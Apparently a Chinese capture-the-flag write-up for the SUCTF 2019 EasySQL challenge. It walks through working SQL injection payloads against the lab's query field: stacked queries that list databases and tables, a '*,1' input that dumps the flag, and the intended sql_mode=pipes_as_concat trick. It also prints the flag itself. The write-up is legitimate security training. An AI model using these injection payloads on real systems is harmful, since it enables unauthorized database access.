# [SUCTF 2019]EasySQL

## var_dump

示例

```php
<?php
$a = array(1, 2, array("a", "b", "c"));
var_dump($a);
?>
```

输出

```txt
array(3) {
  [0]=>
  int(1)
  [1]=>
  int(2)
  [2]=>
  array(3) {
    [0]=>
    string(1) "a"
    [1]=>
    string(1) "b"
    [2]=>
    string(1) "c"
  }
}
```

## 尝试

随便输入数字，回显都是

```txt
Array
(
    [0] => 1
)
```

输入 `xxx'` 没有回显，输入双引号回显 `nonono`，应该是被过滤了，注入点应该为数字型，不同数字回显都相同，说明输入被做了什么处理，先尝试一下堆叠注入

```txt
payload:
query=1;show databases;

回显：
Array
(
    [0] => 1
)
Array
(
    [0] => ctf
)
Array
(
    [0] => ctftraining
)
Array
(
    [0] => information_schema
)
Array
(
    [0] => mysql
)
Array
(
    [0] => performance_schema
)
Array
(
    [0] => test
)

payload:
query=1;use ctf;show tables;

回显：
Array
(
    [0] => 1
)
Array
(
    [0] => Flag
)
```

看到 Flag 表在 ctf 数据库中，尝试 `query=1;use ctf;select 8 from Flag;` 回显 `nonono`，貌似过滤了 `Flag`，然后就是对后端语句的猜测，由于输入任何数字的查询结果都是 1，猜测后端对输入进行了 或 运算，可能是 `select $query || xxx from Flag`，尝试构造 `select *, 1 || xxx from Flag` 选出所有内容。

```txt
payload:
query=*,1

回显：
Array
(
    [0] => flag{3d0b13bc-3751-4669-b658-d339c4359af0}
    [1] => 1
)
```

预期解：
将 `||` 设置为字符串拼接符

```txt
payload:
query=1;set sql_mode=pipes_as_concat;select 1
```
